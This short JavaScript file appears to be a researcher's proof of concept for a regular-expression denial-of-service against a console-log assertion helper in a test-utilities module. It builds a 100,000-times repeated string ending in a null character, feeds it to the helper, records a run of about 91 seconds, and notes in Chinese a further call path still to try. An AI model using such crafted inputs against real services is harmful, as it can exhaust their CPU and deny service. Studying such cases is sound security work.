import { createLogAssertion } from "./consoleMock.js";

//Attack String :""+"Check your code at "*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "Check your code at ";
}
str += "\u0000";

//成功的调用路径：createLogAssertion(将__DEV__改为了true)
const callback = () => {
  return [[1, 2], ""];
};
const myFunc = createLogAssertion("", "b", callback);
console.log(myFunc([str]));

// real    1m31.225s
// user    1m30.996s
// sys     0m0.000s

//糟糕！属于internal-test-utils文件夹!

//在运行至正则表达式所在行之后报错

//尚未尝试的调用路径：normalizeComponentStack----->assertConsoleLogsCleared
